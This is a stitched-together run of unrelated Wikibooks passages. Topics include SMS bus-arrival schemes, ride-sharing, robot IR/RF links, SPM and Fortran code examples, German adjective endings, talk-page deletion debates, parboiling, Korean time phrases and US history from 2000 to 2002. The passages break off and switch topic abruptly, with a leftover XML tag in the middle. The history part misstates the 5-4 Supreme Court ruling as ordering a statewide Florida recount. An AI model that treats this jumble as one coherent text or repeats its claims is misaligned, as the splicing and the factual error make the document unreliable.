The person waiting for the bus would then [[w:Short_message_service|SMS]] the code of the bus stop they are waiting at followed by the number of the bus they are waiting for and receive a [[w:Short_message_service|SMS]] reply with an estimated time until arrival.  The transport authority could charge a small fee for the [[w:Short_message_service|SMS]] and tehreby recoup the cost of the system.

Note: In Swindon, UK, this system is already in place. Each bus stop has an alphacode on it, which can be texted to a 5-digit number for a list of the next buses, and their estimated times of arrival. Thamesdown Transport Ltd charges a fee of 25p (I think) on top of your normal text rate.

** He might say, 'Imagine a wheel on your phone keypad, and for UK, the service number starts with Eight, anti-clockwise'

Reason to amend this idea:
Each Stop should have a smart card or RF tag in it which trasmit a standarized signal within a foot raduis of the bus stop.  PDA, phone, notebooks should develop an interface that recieved and display the bus schedule.

:This idea is also in use in Dublin, Ireland by Dublin Bus, you can text them a code, and you get a list of the next bus and expected arrival for that route. [[User:CGorman|CGorman]] 20:50, 13 Mar 2005 (UTC)

==An e-bay style hitchhiking network.==

E-bay lets you rate a seller after you buy something from them. This concept could be used in many more areas letting peers-to-peer networks replace current institutions. For instance, instead of having the government or a single business provide a city's transportation needs, people could organize rides on the web. All you would need to do is let people pick where they are and where they need to go, and up would pop a list of people who are going the same way and are looking to car pool, charge a small fee, or who are just looking for company. 

After each ride people would evaluate the other person Of course people could choose to only ride with people of the same sex, and luckily for us we live in an age of very little online privacy. Maybe you could have links to sites that do criminal checks or other things. In a perfect society this would be the way to go. It might also work in small towns, where everyone already knows each other, but they might not know the travel plans of their friends. 

This might not work among the larger population, but if you were able to enter in people that you already know it may just work. For instance, I know about 30 people at work, and about 30 people at church, and about 30 people from school that I could catch rides to places with. If I wanted to go into town on any given Saturday, there is a chance I could catch a ride with one of them.


This is already in use in Germany and it works not only in small towns also in EU. Here is a website from Germany:
www.mitfahrzentrale.de

==Use GPS To Find Lost Items==

Inventory Control tags for personal use.  They could be placed on cell phones, iPods, wallets, you name it.  Anything that you have tagged could them be located by your GPS device when misplaced or lost.  --[[User:137.53.180.128|137.53.180.128]] 22:52, 27 Feb 2005 (UTC)

But then you would have to have a GPS attachted to each of these items and some means of broadcasting that information to the wider world which whilst may help you find your MP3 player but it would also help criminals because your stuff will be advertising its location to the world through Radio waves. Also, a gps would not fit inside a wallet or cell phone. And finally! GPS units can be rendered completely disabled by placing an empty packed of crisps above the reciever. So provided your GPS's are small enough to fit in whatever you want whilst having enough battery life for you to be able to find it, if it is underneath something it wont know where it is.

A simpler idea is just for a little radio broadcast unit inside the personal item just to broadcast beeps and without the complication of GPS but using the same priniciples you can triangulate the location of your item with 3 or more recievers.

Better yet might be a small label with a phone number and dollar number you are offering for return safely.

==Data transmission channels==

Being able to send data to and from your robot can be a very handy addition. There are 2 commonly used methods for wireless data transmission: IR (InfraRed) and RF (Radio Frequency). Both methods have their own advantages and disadvantages. Which to use depends on several factors.

===IR===
IR data transmission best known example is the TVs remote control. Using IR on a robot is quite easy and very cheap. The disadvantage of IR is that it's limited to line-of-sight transmission.Line-of-sight or the distance of operating can be increased by use of microwaves (transmission-receiver) systems

===RF===
RF are well known in radio controlled cars. RF is more expensive than IR, but doesn't have the line-of-sight limitation. These days there are complete RF &quot;modems&quot; available which can be connected to a robot without much (or even any) extra components. Although possible building your own RF communication modules isn't advisable. There are strict laws about which frequencies you can use and with how much power you can transmit.

==Using IR==
IR is not much more than modulated lightflashes. Since IR falls outside of the visual spectrum humans can't see these flashes without e.g. a digital camera (the CMOS image chip can see IR, on the screen those IR flashes appear bright white).

===Remote Control===
The great thing about IR remote controls is that you can use many of these directly to control your robot. Although there are several (very) differend IR remote control standards, there is one standard that is used by multiple manufacturers. This standard, called RC5, is very easy to use as many programming languages for microcontrollers have build in RC5 support. The hardware is limited to an integrated receiver module (e.g. TSOP1736), a capacitor and a resistor.

== Batch Scripts ==

See this [http://www.icn.ucl.ac.uk/courses/MATLAB-Tutorials/Sessions2008_09/Guillaume_Flandin/Batching%20SPM.ppt Powerpoint presentation] for an overview.

See the relevant chapter in the [http://www.fil.ion.ucl.ac.uk/spm/doc/manual.pdf#Chap:batch_interface SPM manual].

For general comments on scripting with MATLAB and SPM see the [http://en.wikibooks.org/wiki/SPM/Programming_intro programming intro].

== Batch Script for SPM12 ==

Any batch script should follow the template:

 spm('defaults','fmri');
 spm_jobman('initcfg');
 
 matlabbatch{1}.spm... = ...;
 
 spm_jobman('run',matlabbatch);

== Batch Script for SPM8 ==

SPM12's advices also apply to SPM8.

The Batch Scripts for SPM5 below can also be used in SPM8.

== Batch Script for SPM5 ==

Examples of script (for SPM5 and compatible with SPM8) are provided with the [http://www.fil.ion.ucl.ac.uk/spm/data/ SPM Data Sets], for example:

== Attributes are missing ==

I couldn't find the topic of attributes in C#. Where should this subchapter added? And: I propose that other important missing subjects should also be included in the table of contents so that it is easier find missing information. [[User:Sae1962|Sae1962]] ([[User talk:Sae1962|discuss]] • [[Special:Contributions/Sae1962|contribs]]) 09:43, 17 August 2011 (UTC)

== General info missing ==

On a few pages the phrase &quot;assembly&quot; or &quot;assemblies&quot; is used. This is quite a common term used in C# documents. There is, however, no mention in the book what this actually means.

The &quot;using&quot; directive isn't really explained as far as I can tell. What's it for? How does one include code (compiled or not) by others like libraries.

The same goes for indexes, it is mentioned ones but never really explained, nor are the basic data types.

It would also be good to elaborate a bit more on the subject of actually creating an application instead of only focussing on the language itself. Compiling is mentioned briefly, but what is next? What would be a general structure to set up an application? What is an .pa file, how and when should it be used?

== Inheritance as an advanced topic ==

Does the Inheritance chapter deserve to be under advanced topics? It seems to me that inheritance is an integral part of understanding classes/objects and some new readers may avoid it altogether (I know I try to stick to what are considered the &quot;basics&quot; of a language for a time before moving on to more advanced ideas when learning) to their detriment when trying to understand basic OOP concepts. I'm new here and just figured I'd throw it out there.

== Functions and Subroutines ==
In most programs, a block of code is often re-used at several places. In order to minimize duplicating code and facilitate maintaining the code, such blocks of code should be placed within a function or subroutine. A Fortran '''function''' is similar to a mathematical function, which takes one or many parameters as inputs and returns a single output value. A Fortran '''subroutine''' is a block of code that performs some operation on the input variables, and as a result of calling the subroutine, the input variables are modified.

An expression containing a function call:
&lt;source lang=&quot;fortran&quot;&gt;
  ! func1 is a function defined elsewhere
  ! it takes an integer as an input and returns another integer as the output
  a = func1(b)
&lt;/source&gt;

A call to a subroutine:
&lt;source lang=&quot;fortran&quot;&gt;
  ! sub1 is a subroutine defined elsewhere
  ! sub1 performs some operation on input variables e and f
  call sub1(e, f)
  ! now e or f, or both (or neither) may be modified
&lt;/source&gt;

Many programming languages do not distinguish between functions and subroutines (e.g. C/C++, Python, Java). Pure functional programming languages (e.g. Haskell) only allow functions, because subroutines can, in some case, modify input variables as side-effects, which can complicate the code. In Fortran, functions and subroutines are different: the former returns a value while the latter does not.

Functions are simpler than subroutines. A function can only return one variable, and can be invoked from within expressions, like a ''write'' statement, inside an if declaration ''if ('''function''') then'', etc. A subroutine handles many variables and can only be used as a stand-alone command (using the keyword ''call'').

== Function ==

In Fortran, one can use a '''function''' to return a value or an array of values. The following program calls a function to compute the sum of the square and the cube of an integer.
&lt;source lang=&quot;fortran&quot;&gt;
 function func(i) result(j)
    integer, intent(in) :: i ! input
    integer             :: j ! output
    j = i**2 + i**3
 end function func
   
 program xfunc
    implicit none
    integer :: i
    integer :: func
    i = 3
    print*,&quot;sum of the square and cube of&quot;,i,&quot; is&quot;,func(i)
 end program xfunc
&lt;/source&gt;
The '''intent(in)''' attribute of argument '''i''' means that '''i''' cannot be changed inside the function. 
Note that the return type of func needs to be declared. If this is omitted, some compilers will not compile. Open64 will compile the resulting code with warning, but the behaviour is ill-defined.

An alternative formulation (F77 compatible) is 
&lt;source lang=&quot;fortran&quot;&gt;
 FUNCTION func_name(a, b)
    INTEGER :: func_name
    INTEGER :: a
    REAL    :: b
    func_name = (2*a)+b
    RETURN
 END FUNCTION
    
 PROGRAM cows
    IMPLICIT NONE
    INTEGER :: func_name
    PRINT *,func_name(2, 1.3)
 END PROGRAM
&lt;/source&gt;
The return type of the func_name still needs to be declared, as above. The only difference is how the return type of func_name is referenced within func_name. In this case, the return variable has the same name as the function itself.

== Subroutine ==

A '''subroutine''' can be used to return several values through its arguments. It is invoked with a '''call''' statement. Here is an example.

&lt;source lang=&quot;fortran&quot;&gt;
subroutine square_cube(i,isquare,icube)
  integer, intent(in)  :: i             ! input
  integer, intent(out) :: isquare,icube ! output
  isquare = i**2
  icube   = i**3
end subroutine square_cube

program xx
  implicit none
  integer :: i,isq,icub
  i = 4
  call square_cube(i,isq,icub)
  print*,&quot;i,i^2,i^3=&quot;,i,isq,icub
end program xx
&lt;/source&gt;

==Intent==

When declaring variables inside functions and subroutines that need to be passed in or out, intent may be added to the declaration.

'''intent(in)''' means that the variable value can enter, but not be changed

'''intent(out)''' means the variable is set inside the procedure and sent back to the main program with any initial values ignored.

'''intent(inout)''' means that the variable comes in with a value and leaves with a value (default).

==More on Functions vs. Subroutines ==

Both functions and subroutines can modify their input variables. By necessity, subroutines modify input variables, since they do not return any output value. Functions do not have to, but are allowed, by default, to modify input variables. A function can be turned into a pure function, which does not have any ''side-effects'' through the use of the '''intent''' attribute on all input variables, and further enforced through the keyword '''pure'''. (The '''pure''' keyword imposes additional restrictions, which essentially prevents the function from having any ''side-effects''.)

An example of a '''pure''' function.

&lt;source lang=&quot;fortran&quot;&gt;
pure function square(x)
  real, intent(in) :: x
  real :: square
  square = x * x
end function

program main
  real :: a, b, square
  a = 2.0
  b = square(a)
  ! After invoking the square(.) pure function, we can be sure that 
  ! besides assigning the output value of square(a) to b,
  ! nothing else has been changed.
end program main
&lt;/source&gt;

      <text xml:space="preserve">==Adjectives==

Adjectives are words that describe nouns.  Most adjectives are stand-alone words; however, present and past participles can also be used as adjectives.  Numbers are also adjectives, though they do not decline.


Attributive adjectives precede the noun that they are describing, and are ''always declined''.  Learning the adjective endings is a central part to the study of German.  The adjective endings are frequently one of the hardest topics for new students to learn.  It is best to commit the declension tables to memory, while attempting to speak independently.  Proper use of adjective endings, especially in speaking, will come with repeated use.  They are described in the next part of this chapter.

==Adjective Endings==

===Forms===

This section will make use of the mnemonic '''Oklahoma''', which denotes the fields of nominative masculine; nominative neuter; accusative neuter; nominative feminine; and accusative feminine, which resemble the state of Oklahoma in the tables used below.  The concept is used to describe endings in two declension tables: the weak adjective declension, and the indefinite-article/ein-word declension.

The endings of attributive adjectives can be divided into two groups: ''strong'' endings and ''weak'' endings.


{| class=&quot;wikitable&quot; border=&quot;1&quot; cellpadding=&quot;2&quot;
|+ '''Strong Adjective Declension'''
|-
!'''Case'''
!'''Masculine'''
!'''Neuter'''
!'''Feminine'''
!'''Plural'''
|-
|'''Nominative''' || -er || -es || -e || -e
|-
|'''Accusative''' || -en || -es || -e || -e
|-
|'''Dative''' || -em || -em || -er ||-en
|-
|'''Genitive''' || '''-en''' || '''-en''' || -er || -er
|}

The strong adjective endings are nearly the same as the der-word endings, with the exceptions of masculine and neuter adjectives in the genitive case (marked in bold).
[[File:Map of USA OK.svg|frame|right|250px|alt=State of Oklahoma|Note the shape of the state Oklahoma]]

{| class=&quot;wikitable&quot; border=&quot;1&quot; cellpadding=&quot;2&quot;
|+ '''Weak Adjective Declension'''
|-
!'''Case''' !! '''Masculine''' !! '''Neuter''' !! '''Feminine''' !! '''Plural'''
|-
|'''Nominative''' || '''-e''' || '''-e''' || '''-e''' || -en
|-
|'''Accusative''' || -en || '''-e''' || '''-e''' || -en
|-
|'''Dative''' || -en || -en || -en || -en
|-
|'''Genitive''' || -en || -en || -en || -en
|}

Make note of the region, '''Oklahoma''', in the nominative and accusitive cases, for weak endings.


The use of a weak or a strong adjective ending depends on what precedes it:

{| class=&quot;wikitable&quot; border=&quot;1&quot; cellplanning=&quot;2&quot;
|+ '''Choice of Adjective Ending'''
|-
! Preceding Article !! Choice of Ending
|-
| Definite Article, der-words || Weak Ending
|-
| Indefinite Article, ein-words || Within Oklahoma, Strong Ending
|-
| || Outside Oklahoma, Weak Ending
|-
| No article || Strong Ending
|}

The principle guiding adjective endings is that a noun, when possible, should have a primary case ending.  Definite articles and der-words always provide a primary case ending.  Indefinite articles and ein-words provide primary case endings outside of Oklahoma.  Sometimes nouns have no article, in which case adjectives provide the primary case ending.

==='''Forms in Context of Articles'''===

This terminology - strong and weak endings - is confusing for many students.  As the student develops, he or she will develop an ear for case endings, and will recognize when a noun has and has not received a case ending.  Nonetheless, it is worth providing the three declension tables that result from this principle.


{| class=&quot;wikitable&quot; border=&quot;1&quot; cellplanning=&quot;2&quot;
|+ '''Adjective Declension following a Definite Article or der-word'''
|-
! '''Case''' !! '''Masculine'''!! '''Neuter''' !! '''Feminine''' !! '''Plural'''
|-
| || the large man || the small book || the quiet cat || the red apples
|-
| '''Nominative'''
| de'''r''' groß'''e''' Mann
| rowspan=&quot;2&quot; | da'''s''' klein'''e''' Buch
| rowspan=&quot;2&quot; | di'''e''' ruhig'''e''' Katze
| rowspan=&quot;2&quot; | di'''e''' rot'''en''' Äpfel
|-
| '''Accusative'''
| de'''n''' groß'''en''' Mann
|-
| '''Dative'''
| de'''m''' groß'''en''' Mann
| de'''m''' klein'''en''' Buch
| rowspan=&quot;2&quot; | de'''r''' ruhig'''en''' Katze

|-
| '''Genitive'''
| de'''s''' groß'''en''' Mann'''es'''
| de'''s''' klein'''en''' Buch'''es'''
| de'''r''' rot'''en''' Äpfel
|}

Adjectives following a definite article or der-word always have a weak ending.  Within Oklahoma, that is &quot;-e&quot;, and outside of Oklahoma, that is &quot;-en&quot;. Also dies.., jed.., manch.., welch.., solch.. and all.. get the same ending as in the table above.


{| class=&quot;wikitable&quot; border=&quot;1&quot; cellplanning=&quot;2&quot;
|+'''Adjective Declension following an Indefinite Article or ein-word'''
|-
! '''Case''' !! '''Masculine'''!! '''Neuter''' !! '''Feminine''' !! '''Plural'''
|-
| || a large man || a small book || a quiet cat || no red apples
|-
|'''Nominative'''
| ein groß'''er''' Mann
| rowspan=&quot;2&quot; | ein klein'''es''' Buch
| rowspan=&quot;2&quot; | ein'''e''' ruhig'''e''' Katze
| rowspan=&quot;2&quot; | kein'''e''' rot'''en''' Äpfel
|-
|'''Accusative'''

|'''Dative'''
| ein'''em''' groß'''en''' Mann

|-
|'''Genitive'''
| ein'''es''' groß'''en''' Mann''es''
| ein'''es''' klein'''en''' Buch''es''
| kein'''er''' rot'''en''' Äpfel
|}

Note how, within Oklahoma, adjectives take strong endings, and outside Oklahoma, they take weak endings.  This is because indefinite articles provide primary endings only outside of Oklahoma. Also mein.., dein.., sein.., ihr.., unser.., euer.. and Ihr.. get the same ending as in the table above.

Forms of nouns without articles are rare compared to those with definite and indefinite articles; however, one must still know the strong declension.  Note that the strong adjective declension is almost the same as the der-word endings, with the exceptions of masculine and neuter in the genitive case (in bold).

==Adverbs==

Adverbs based on adjectives are one of the simplest parts of German grammar.  Any adjective can be used as an adverb simply by placing its uninflected form within the sentence, usually towards the end.  

 Das Ehepaar ging gestern ''fröhlich'' spazieren.
 (The married couple went for a walk joyfully yesterday.)

Other adverbs have no adjectival equivalent.  Many of these express time.  

 ''Damals'' (at that time)
 Ich bin ''gestern'' dort gewesen.  (I was there yesterday.)
 ''Morgens'' bin ich normalerweise im Büro.  (I am normally in the office in the morning.)

Adverbs can also be based on participles (past and present).  These are less common.

 Er betrachtete mich ''bedrohlich''.  (He looked at me threateningly.)

Some adverbs are formed by adding ''-weise'' to adjectives and nouns in the plural form, and mean &quot;regarding&quot;, &quot;with respect to&quot;, or &quot;-wise&quot; in English.  Construction of new adverbs of this sort is usually frowned upon.



===Adverbs based on prepositions===

''Much of the material in this section will be explained in greater detail in the chapter on prepositions.''

German has a complex system of adverbs based on prepositions, which are used to indicate direction of motion, location, time, and other concepts.  English also possesses such a system, though it is used less.  Consider the following sentences in English:

 1) Could you take the garbage ''out''?
 2) Come ''over'' this evening if you get the chance.
 3) You should just give ''up''.
 4) I will look you ''up'' in the phone book.
 5) The contract, and the conditions contained ''therein'', is ''hereby'' declared null and 
    void. (Legalese)

In both English and German, prepositions and particles derived from prepositions are treated as adverbs.  In many cases, these prepositional adverbs are associated with specific verbs.

In the first two examples, the italicized prepositions are used as adverbs of motion; in the first example, the word &quot;out&quot; indicates the direction &quot;out of the apartment&quot;; in the second case, &quot;over&quot; not only means means the direction &quot;towards&quot;, but also implies visitation of a residence.  

The third and fourth examples correspond to ''separable-prefix verbs'' in German.  The word &quot;up&quot; is integral to the verb, which would have a different meaning without the adverb.  &quot;To give up&quot;, whose infinitive in German would be &quot;to up-give&quot;, means &quot;to quit&quot;, in sharp contrast to &quot;to give&quot;.  In the fourth example, it is not even possible to &quot;look someone&quot;, whereas it is possible to &quot;look someone up,&quot; or &quot;look a candidate's resume over&quot;.  (English even has inseparable prepositional prefix verbs; compare &quot;to look s.o. over&quot; to &quot;to overlook s.o.&quot;  Many of these verbs have been replaced by verbs based on Latin and Greek.)

The adverbs in the fifth example correspond to ''da-, wo-, hin- and her-'' compounds in German.  Such compounds are often used in legal texts in English.  In such compounds, the object of the preposition is replaced with the words &quot;there&quot; or &quot;here&quot;, compounded with the preposition.  &quot;Therein&quot; simply means &quot;in it&quot;.  

The German system of adverbs based on prepositions is considerably more rigorous, and forms the basis of a large part of the language's morphology.  &quot;To catch on&quot; means &quot;to begin&quot; in English; In German, the primary word for &quot;to begin&quot; is literally &quot;to catch on&quot; (''anfangen''), from which the equivalent noun, ''der Anfang'' (the beginning) is derived.  A remnant of this in English can be found when describe a child's ''upbringing''.

As in English, prepositional adverbs in German to varying degrees alter the meaning of their associated verb.  

''Separable-prefix verbs''.  This topic is better explored in the chapter on verbs.  Separable prefixes are themselves ''adverbs''.  As in English, many of them are integral to the meaning of the verb.  ''Fangen'' means &quot;to catch,&quot; whereas ''anfangen'' means &quot;to begin&quot;.  

Most prepositional adverbs are treated as part of the root word in the infinitive, and are used as such in the construction of participles.  However, not all possible separable-prefix verbs are lexical; &quot;vorbeikommen&quot; (to come over), &quot;vorbeibringen&quot; (to bring over), and so on, may not all be listed in a dictionary.  It is better to learn &quot;vorbei&quot; as an adverb implying visitation.

The German prefix ''in'' is of note.  It has two adverbial forms.  As ''in'' it describes location; when describing movement, it becomes ''ein''.  Thus, for example, ''darin'' means &quot;in there&quot;, whereas ''darein'' means &quot;in(to) there&quot;.  Another example is the word, ''einleiten'', to introduce.

''Hin-'' and ''her-''.  Prepositional adverbs of motion are usually based on ''hin-'', implying motion or direction away from the speaker, and ''her-'', implying motion or direction towards the speaker.  ''Hin'' and ''her'' are themselves stand-alone adverbs meaning the same thing, and describe less-specific motion or direction.  (One example in which ''hin'' is an integral separable prefix is the verb ''hinrichten'', which means &quot;to execute.)  Not all verbs formed from ''hin-'' and ''her-'' compounds are lexical.  Some examples of ''hin-'' and ''her-'' compounds are:

 ''herab'' (down, down from)
 ''hinein'' (in, inside)
 ''hinaus'' (out, out of, onto)
 ''darüber hinaus'' (furthermore, above all)
 ''dahin'' (in the direction/towards of known location)

Mastery of ''hin-'' and ''her-'' requires considerable effort from the student.

''Da-'' compounds are also adverbs, corresponding to &quot;there-&quot; compounds in English.  They replace specific prepositional objects.  Although are used principally in legal texts and therefore sound formal in English, they are often employed in written and spoken German and are  convenient replacements for long and complicated prepositional phrases.  Their comprehension and active use are essential in German.  ''Da-'' compounds are formed by adding ''da-'' before the preposition, with an &quot;r&quot; inserted before prepositions starting with a vowel.  There are exceptions to this, and ''da-'' compounds are given a fuller treatment in the chapter on prepositions.

''Hier-'' and ''dort-'' compounds also exist in German, though they are used less frequently.  As in English, they are considered formal, and are used primarily in academic and legal texts.  They are best memorized as vocabulary.

 ''hierhin und dorthin'' - hither and thither

Note that the [[Mesopotamian Marshlands]] book is under a [[VfD|Vote for Deletion]] right now.
You should answer that at least. The book appears to be abandoned.

It is generally a good idea to finish a book before you start on a new one. If you have
abandoned a book, you should place it on the [[VfD|Vote for Deletion]] page yourself,
so that people aren't left to wonder if it will ever be finished.

== database wikibook ==

&quot;DataPerfect&quot; may have been a nice piece of software at one time. But I suspect it is no longer available. Perhaps it would be better to make a wiki book discussing a more easily available database. Doesn't http://OpenOffice.org/ have a simple database ? Or perhaps one of the other databases listed at http://osdb.sourceforge.net/ .
--[[User:DavidCary|DavidCary]] 05:44, 19 Feb 2005 (UTC)

:DataPerfect is freely available and is alive and well - as is its author, Lew Bastian, the Data Oefect Users Discussion Group [http://ww.dataperfect.nl], and a dedicated group of DataPerfect practitioners who gathered in the 2004 DataPerfect Developers Conference in September 2005 in Huntignton Beach California. A video of the conference is available - in a set of seven DVDs of almost the entire proceedings.

:Lew's latest modifications to the database include the ability to run - and manage web sites - from directly on a web server and to translate accented ASCII chanacters, line field, bold, underline, italic, special characters, etc. into their html equivalents.

:DataPerfect is being used in many creative ways for such diverse purposes including managing domain registration, an online store and a community web site as well as increasingly to generate web sites based on extensive sets of pages - in conjunction with a design based on elementary html with tables, cells and cascading style sheets. DataPerfect remains, imho, unsurpassed as a relational database in its elegance, power, robustness and integrity. [[User:Information Ecologist|Information Ecologist]] 23:51, 28 Feb 2005 (UTC)

== VfD ==

I moved some text down from speedy deletion to the [[Wikibooks:Votes_for_deletion#Mesopotamian_Marshlands|regular area]], where you may have
missed an ongoing discussion about your books. I hope you will soon explain how your
books fit in here. It appears that you expect to update them in large chunks, likely
replacing text from other contributers. Wiki books are normally hand-edited by the
whole community. This is not a place to dump data with the expectation that nobody
else will touch it. This is a place for non-fiction works, generally being educational
and factual in nature. [[User:AlbertCahalan|AlbertCahalan]] 23:45, 20 Feb 2005 (UTC)

:I hope by now you will have read my several responses to the '''Vfd''' discussion, including my response to your comment about this issue there. Since writing that, I have realized that it might make sense also to make use of forms that contributors can use to edit and add to the Wikibook - essentially an experimentl hybrid - so that they can participate without having to learn the ins and outs of wiki codes. I am also planning to devote what will effectively be a common Appendix with guidance on how to work in a Wiki platform; this section would build on the framework I had been developing under User:Information Habitat in wikipedia.

== VfD Again ==

Sorry to push this up, but I'd like to know what happened to the Wikibook [[Information Ecology]]?  It is currently up on a [[Wikibooks:Votes for deletion|vote for deletion]] (or at least the remaining pages of it).  I'd really like you to try to defend your work here, and what the purpose of this Wikibook can serve.  Seriously, I'd like to see you continue to contribute to Wikibooks, but inactivity on some of these Wikibooks may lead to their removal.  It is more about the fact that we don't really understand the content, and would like you to try and explain what it is all about. --[[User:Robert Horning|Rob Horning]] 05:02, 7 August 2005 (UTC)

Hacer needs to be shown that it is ''not'' just &quot;to do&quot;, and that the &quot;do&quot; in the question (for example) &quot;Do you want a car?&quot; would be translated &quot;Quiere usted un carro?&quot; instead of &quot;Hace querrer un carro?&quot;; the &quot;to do&quot; in these cases is understood.--[[User:Naryathegreat|Naryathegreat]] 04:01, 19 Feb 2005 (UTC)

== Just Hacer? ==

I think that salir and poner should also be introduced alongside hacer, because they share the same difference with the first person.

Hi!

You say &lt;&lt;We write this often as F[x]/&lt;m(x)&gt;=F(α) where α is &quot;the root of&quot; m(x) - we define α to be the root of m(x).&gt;&gt;

I think we are talking about a finite field F (although, I believe, this fact isn't stated in the page and I think it would be good if it were). Nevertheless, the polynomial m(x) has several roots, so a commentary stating the isomorphism of F(α) for every root α of m(x) may be useful. In fact, if F isn't finite, then the F(α) can be distinct! (We can take for example x^3-2 over Q). I would add my last comment as well, for completeness!

'''Parboiling''' is the act of partly cooking an ingredient by boiling for less than the full time needed to cook it. For example, [[Cookbook:Potato|potatoes]] and other vegetables may be parboiled before being roasted (as in [[Cookbook:Roast Potatoes|roast potatoes]]), or green beans may be parboiled (and immediately chilled in cold water) as a preparation for freezing.

This technique is also used as a method to quickly cook [[Cookbook:Pork|pork]] ribs before grilling, although I would never, ever, in my life, do this. You get pork broth if you boil ribs!</text>

In Korean, time is expressed like &quot;Now is...&quot;.  So one would say &quot;지금은 여섯시 입니다&quot; to express &quot;It is six o'clock.&quot;  The &quot;지금은&quot; means &quot;now is,&quot; the &quot;여섯시&quot; means &quot;six o'clock,&quot; and the &quot;입니다&quot; means roughly &quot;it is/be.&quot;

===Dialogue===

:지금 몇 시에요? (jigeum myeot sieyo?)
:What is the time now?

:지금 7시에요. (jigeum 7sieyo.)
:It's 7 o'clock right now.

:지금 2시 30분입니다. (jigeum 2si 30bunimnida.)
:It's 2:30 right now.

:지금 4시 반입니다. (jigeum 4si banimnida.)
:It's 4:30 right now.

====Vocabulary====

*지금 (只今), 현재 (現在): now, at present
*몇: how many
*시 (時): hour
*분 (分): minute
*반 (半): half [an hour]

==2000 Election==

[[Image:George-W-Bush.jpeg|200px|right|thumb|George W. Bush]][[Image:Al Gore, Vice President of the United States, official portrait 1994.jpg|100px|left|thumb|Al Gore]]
As Clinton's presidency came to a close, Democrats nominated Al Gore, Clinton's vice president, as their nominee, and the Republicans chose George W. Bush, the governor of Texas and son of former President George H.W. Bush.

Florida had traditionally been a Democratic-leaning state, but explosive population growth in the late nineties had brought many social and economic conservative Cubans to southern Florida. The growth had left Florida very evenly split among the parties. 

On election night, the news media outlets first predicted Florida to go to Gore, then to Bush, and then decided that the race was too close to call. Florida law provided for an automatic recount when votes differ by such a small margin, and when Florida decided that Bush had won, Gore sued Bush to force further recounts in several Florida counties. Bush counter-sued, and the case went to the Supreme Court of the United States. In a 5-4 decision, the Court decided that the state of Florida must recount all the ballots in all the Florida counties and not just those for which Gore had sued, in accordance with the Equal Protection Clause of the U.S. Constitution. As Florida was required by the Florida Constitution to certify its election within days of the Court's [http://a257.g.akamaitech.net/7/257/2422/14mar20010800/frwebgate.access.gpo.gov/supremecourt/00-949_dec12.fdf decision], there was not enough time to recount the entire state. Thus, the final state count stood, with Bush winning Florida by 537 votes, (and as a result receiving 271 electoral votes to Gore's 267, and therefore gaining the presidency), although he lost the popular vote.

===9/11 and its Aftermath===
Less than a year later, on September 11, 2001, terrorists hijacked four airline jets. At 8:46 a.m., the first plane crashed into the 110-story North Tower of the World Trade Center, and seventeen minutes later the South Tower was hit by a second plane, resulting in a huge explosion and a fire. In just two hours, both of the buildings collapsed, killing thousands, including hundreds of firefighters and police officers responding to the catastrophe. At 9:37, a third plane was flown into the Pentagon, the U.S. military headquarters in Arlington, Virginia, which sustained a huge hole in its west side. A fourth hijacked airliner crashed in Pennsylvania, perhaps as a result of resistance by the passengers.  It appeared to have been heading in the direction of Washington, D.C., and its intended target is believed to have been either the U.S. Capitol building or the White House. Approximately 3000 people died in what came to be known as &quot;9/11&quot;, making it the deadliest ever attack on the country by a foreign enemy.&lt;ref&gt;&quot;A People and A Nation&quot; the eighth edition&lt;/ref&gt;

Responsibility for the attacks was soon attached to Osama Bin Laden, the leader of al-Qaeda, an Islamic terrorist network with training camps in Afghanistan.  Bin Laden's exact grievances have been debated, but include US military presence in major Islamic nations and US support of Israel.  There had been many smaller terrorist attacks aimed towards Americans by al-Qaeda before 2001, including the bombing of US embassies in Kenya and Tanzania in 1998.

The attacks, while devastating and deadly, abruptly ended the period of sharp division after the 2000 election. Soon after the attacks, U.S. President George W. Bush declared a “war on terrorism,” warning countries that harbored terrorists would face the full power of the U.S. military. The United States charged Al Qaeda with responsibility and demanded that the Taliban turn over bin Laden and the Al Qaeda leadership, and dismantle terrorist training camps in Afghanistan. In October, the United States and Great Britain launched an attack on the Taliban and terrorists within Afghanistan. The Taliban government quickly collapsed and many Al Qaeda leaders were captured or killed, though Bin Laden would remain at large for nearly ten years. Bin Laden’s role in enabling the attacks appeared to be confirmed by videotapes in which he said that the September 11th attacks had been even more destructive than he had hoped they would be. In the weeks following September 11, a series of letter containing anthrax spores went through the mail in the United States, ultimately killing five people. No evidence was found to link the anthrax to Al Qaeda, but the anthrax scares contributed to an atmosphere of uncertainty and even panic. In response to the September 11th attacks, security has been considerably tightened on airplanes, in buildings, and in public areas. U.S. authorities detained hundreds of people whose actions or immigration status made them appear questionable, and Bush created special military tribunals that could try foreign nationals accused of terrorism. &lt;ref&gt;Bennis, Phyllis. Before and After: U.S. Foreign Policy and the September 11th Crisis. New York. Olive Branch Press. 2003. Print Cole, A. Leonard. The Anthrax Letters. Washington D.C. Joseph Henry Press. 2003. Print Raines, Howell.  A New York Times: A Nation Challenged. New York. Callaway. 2002. Print.&lt;/ref&gt;


The attacks also shook the worldwide economy. Stocks tumbled when the New York Stock Exchange reopened the week following the attacks. The travel industry also declined because fewer Americans wanted to fly (due to the nature of the 9/11 attacks).In the immediate aftermath of the September 11 attacks, the United States and other countries around the world were placed on a high state of alert against potential follow-up attacks. Civilian air travel across the U.S. and Canada was — for the first time ever — almost completely suspended for three days with numerous locations and events affected by closures, postponements, cancellations, and evacuations. Other countries imposed similar security restrictions. In the United Kingdom, for instance, civilian aircraft were forbidden to fly over London for several days after the attack. Many airlines went bankrupt. A recession, following the economic boom during Bill Clinton's second term, was exacerbated by the attacks.

The World Trade Centers were occupied by a lot of firms conducting key economic activities (e.g., stock trading). With the two towers going down on September 11th, the stock market began to decline. This had an impact on employment and decreased the amount of available jobs for Americans.

===The War on Terror===
Directly following the September 11th attacks, Congress drafted and overwhelmingly passed the USA PATRIOT Act, which was signed into law on October 26, 2001. The law, while forcing citizens to forfeit some rights, strengthened the government's ability to gather information and convict suspected terrorists. Hundreds of accused terrorists have been charged and approximately half have been convicted. There have, however, been reports of abuse of the law, which went under reexamination by Congress in 2005.

In response to the attacks, the United States declared a symbolic war on terrorism. The first target in the war was Afghanistan, where the Taliban government was believed to be hiding Bin Laden and al-Qaeda. After the Taliban refused to turn Bin Laden over, American and British forces began bombing strategic Taliban centers on October 7. The invasion was swift, and major fighting had ended by the middle of 2002. The Taliban government was eliminated, and the Afghanis soon participated in their first democratic processes in many years.

